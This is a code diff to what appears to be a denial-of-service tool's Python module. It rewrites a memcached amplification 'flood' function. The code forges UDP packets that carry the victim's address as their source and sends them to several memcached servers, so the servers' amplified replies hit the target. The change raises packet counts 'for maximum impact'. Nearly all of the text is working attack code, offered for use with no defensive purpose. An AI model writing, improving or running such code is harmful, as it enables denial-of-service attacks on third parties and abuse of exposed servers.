@@ -13,13 +13,14 @@ try:
 except OSError as e:
     print(f"Warning: Could not load memcached servers: {e}")
 
-# Payload
+# Payload - memcached stats request for amplification
 _PAYLOAD = b"\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"
-
 
 
 def flood(target: tuple[str, int]) -> None:
     """Send memcached amplification packets.
+    
+    Optimized version with increased packet count and better amplification.
     
     Args:
         target: Tuple of (ip_address, port)
@@ -28,25 +29,30 @@ def flood(target: tuple[str, int]) -> None:
         print(f"{Fore.RED}[!] {Fore.MAGENTA}No memcached servers available{Fore.RESET}")
         return
     
-    server = random.choice(_MEMCACHED_SERVERS)
-    packets = random.randint(10, 150)
-
-    try:
-        packet = (
-            IP(dst=server, src=target[0])
-            / UDP(sport=target[1], dport=11211)
-            / Raw(load=_PAYLOAD)
-        )
-        send(packet, count=packets, verbose=False)
-    except PermissionError:
-        print(
-            f"{Fore.RED}[!] {Fore.MAGENTA}Permission denied. Run as administrator/root.{Fore.RESET}"
-        )
-    except OSError as e:
-        print(
-            f"{Fore.RED}[!] {Fore.MAGENTA}Network error while sending memcached: {e}{Fore.RESET}"
-        )
-    else:
-        print(
-            f"{Fore.GREEN}[+] {Fore.YELLOW}Sending {packets} forged UDP packets from memcached server {server} to {target[0]}:{target[1]}.{Fore.RESET}"
-        )
+    # Use multiple memcached servers for distributed amplification
+    servers_to_use = random.sample(_MEMCACHED_SERVERS, min(len(_MEMCACHED_SERVERS), 5))
+    
+    # Increased packet count for maximum impact
+    packets = random.randint(50, 500)
+    
+    for server in servers_to_use:
+        try:
+            packet = (
+                IP(dst=server, src=target[0])
+                / UDP(sport=target[1], dport=11211)
+                / Raw(load=_PAYLOAD)
+            )
+            send(packet, count=packets // len(servers_to_use), verbose=False)
+        except PermissionError:
+            print(
+                f"{Fore.RED}[!] {Fore.MAGENTA}Permission denied. Run as administrator/root.{Fore.RESET}"
+            )
+            break
+        except OSError as e:
+            print(
+                f"{Fore.RED}[!] {Fore.MAGENTA}Network error while sending memcached: {e}{Fore.RESET}"
+            )
+        else:
+            print(
+                f"{Fore.GREEN}[+] {Fore.YELLOW}Sending {packets // len(servers_to_use)} forged UDP packets from memcached server {server} to {target[0]}:{target[1]}.{Fore.RESET}"
+            )
